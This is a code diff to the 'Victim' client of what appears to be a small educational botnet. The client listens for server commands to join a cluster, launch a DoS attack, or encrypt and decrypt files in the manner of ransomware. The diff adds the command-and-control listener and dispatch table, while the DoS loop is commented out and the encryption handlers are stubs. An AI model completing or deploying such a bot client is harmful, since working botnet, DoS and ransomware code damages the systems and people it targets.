@@ -5,10 +5,13 @@ from messenger import *
 from time import sleep
 
 PORT = 3838
-
+VICTIM_LISTEN_PORT = 4848
+SERVER_IP = "127.0.0.1"
 
 # SHOULD PROBABLY MAKE A MSG PARSER OR SOMETHING
 # XXXXX
+
+
 class Victim(object):
 
     def __init__(self):
@@ -23,39 +26,48 @@ class Victim(object):
         print "Got %s" % msg
         return
 
+    def process_decrypt_files(self, msg):
+        print "Decrypting files..."
+        return
+
     def process_dos_attack(self, msg):
         # MSG Looks like
-        # "IP, num_packets"
+        # "IP"
         # Sleep for 0.1 since it will drop the majority of packets
-        print "Target for dos attack %s" % msg
-        target_ip = str(msg[0])
-        num_packets = int(msg[1])
-        for i in range(num_packets):
+        print "Target for dos attack %s" % str(msg[0])
+        '''target_ip = str(msg[0])
+        for i in range(2):
             sleep(1)
-            Messenger.send_message(target_ip, PORT, "DOS")
+            Messenger.send_message(target_ip, PORT, "DOS")'''
 
-    def process_ransomware_attack(self, msg):
-        print "ransomware attack"
-        # Calls Calvin's program
+    def process_encrypt_files(self, msg):
+        print "Encrypting files..."
+        # Calls encrypt.py
         pass
 
     def process_new_victim(self, msg):
-        print "New victim to add to cluster"
         # The server should have list of all infected machines
         # Add to that list
-        pass
+        Messenger.send_message(SERVER_IP, PORT, "JOIN")
+        print "Joined"
 
-    def processing_thread(self, msg):
-        msg_type = Messenger.get_msg_type(msg)
-        stripped_msg = Messenger.strip_msg(msg)
-        msg_to_run = Victim.MSG_COMMANDS[msg_type](self, stripped_msg)
+    def processing_thread(self):
+        # Get a message
+        # Call the appropriate handler
+        s = Messenger.set_up_listening_socket(VICTIM_LISTEN_PORT)
+        while True:
+            data, victim = s.recvfrom(8192)
+            print "Response from Server: %s" % (str(victim[0]))
+            M_type = Messenger.get_msg_type(data)
+            self.MSG_COMMANDS[M_type](self, Messenger.strip_msg(data))
+        s.close()
 
-    # Get a message
-    # Call the appropriate handler
+    # MSG DICT
     MSG_COMMANDS = {
         'JOIN': process_new_victim,
         'DOS': process_dos_attack,
-        'RANSOMEWARE': process_ransomware_attack
+        'RANSOMEWARE': process_encrypt_files,
+        'DECRYPT': process_decrypt_files
     }
 
 
